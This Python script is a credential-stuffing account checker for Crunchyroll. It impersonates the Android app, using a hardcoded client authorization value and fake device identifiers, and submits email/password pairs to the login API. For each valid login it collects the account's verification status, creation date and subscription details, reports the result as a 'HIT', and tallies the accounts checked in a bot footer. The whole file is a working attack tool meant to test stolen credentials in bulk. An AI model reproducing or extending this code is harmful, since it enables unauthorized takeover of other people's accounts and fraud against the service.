import requests
import json
import time

def check_crunchy(email, password):
    login_url = "https://beta-api.crunchyroll.com/auth/v1/token"
    headers = {
        "Authorization": "Basic Z3N1ZnB0YjBmYW43dGFndG1ub3I6UUU1djBqc3Y5OVhNY2xadVNPX0Jfem1wOE03YlBfMnM=",
        "Connection": "Keep-Alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "ETP-Anonymous-Id": "b10da375-d759-47ce-aa9e-d666157c4325",
        "Host": "beta-api.crunchyroll.com",
        "User-Agent": "Crunchyroll/3.32.2 Android/7.1.2 okhttp/4.9.2"
    }
    data = {
        'username': email,
        'password': password,
        'grant_type': 'password',
        'scope': 'offline_access',
        'device_id': 'a6856484-cbcd-46f5-99b9-db8cff57ec17',
        'device_name': 'SM-G988N',
        'device_type': 'samsung SM-G9810'
    }

    response = requests.post(login_url, headers=headers, data=data)
    try:
        response_data = response.json()
    except json.JSONDecodeError as e:
        return "Dead", f"Failed to decode JSON: {str(e)}"
    
    if response.status_code == 200 and 'access_token' in response_data:
        access_token = response_data['access_token']

        # Get account information
        account_info_url = "https://beta-api.crunchyroll.com/accounts/v1/me"
        account_info_headers = {
            "Authorization": f"Bearer {access_token}",
            "Connection": "Keep-Alive",
            "Host": "beta-api.crunchyroll.com",
            "User-Agent": "Crunchyroll/3.32.2 Android/7.1.2 okhttp/4.9.2"
        }

        account_info_response = requests.get(account_info_url, headers=account_info_headers)
        try:
            account_info_data = account_info_response.json()
        except json.JSONDecodeError as e:
            return "Dead", f"Failed to decode JSON: {str(e)}"

        email_verified = account_info_data.get('email_verified', 'N/A')
        account_creation_date = account_info_data.get('created', 'N/A')[:10]
        external_id = account_info_data.get('external_id', 'N/A')

        # Get subscription information
        subscription_info_url = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products"
        subscription_info_headers = {
            "Authorization": f"Bearer {access_token}",
            "Connection": "Keep-Alive",
            "Host": "beta-api.crunchyroll.com",
            "User-Agent": "Crunchyroll/3.32.2 Android/7.1.2 okhttp/4.9.2"
        }

        subscription_info_response = requests.get(subscription_info_url, headers=subscription_info_headers)
        try:
            subscription_info_data = subscription_info_response.json()
        except json.JSONDecodeError as e:
            return "Dead", f"Failed to decode JSON: {str(e)}"
        
        subscription_items = subscription_info_data.get('items', [])

        if subscription_items:
            subscription_item = subscription_items[0]
            subscription_name = subscription_item.get('product', {}).get('sku', 'Subscription Not Found')
            currency = subscription_item.get('currency_code', 'N/A')
            subscription_amount = subscription_item.get('amount', 'N/A')

            response_message = (
                f"HIT SUCCESSFULLY✅\n"
                f"Email Verified: {email_verified}\n"
                f"Account Creation Date: {account_creation_date}\n"
                f"Subscription Name: {subscription_name}\n"
                f"Currency: {currency}\n"
                f"Subscription Amount: {subscription_amount}\n"
            )
            return "Hit", response_message
        else:
            response_message = (
                f"HIT SUCCESSFULLY✅\n"
                f"Email Verified: {email_verified}\n"
                f"Account Creation Date: {account_creation_date}\n"
                f"Subscription Info: {json.dumps(subscription_info_data)}\n"
            )
            return "Hit", response_message
    else:
        error_message = response_data.get('error_description', 'Invalid Credentials🚫')
        return "Dead", error_message

def get_footer_info(total_accounts, start_time, username):
    elapsed_time = time.time() - start_time
    footer = (
        f"－－－－－－－－－－－－－－－－\n"
        f"🔹 Total Accounts Checked - {total_accounts}\n"
        f"⏱️ Time Taken - {elapsed_time:.2f} seconds\n"
        f"▫️ Checked by: {username}\n"
        f"⚡️ Bot by - AFTAB 👑\n"
        f"－－－－－－－－－－－－－－－－"
    )
    return footer
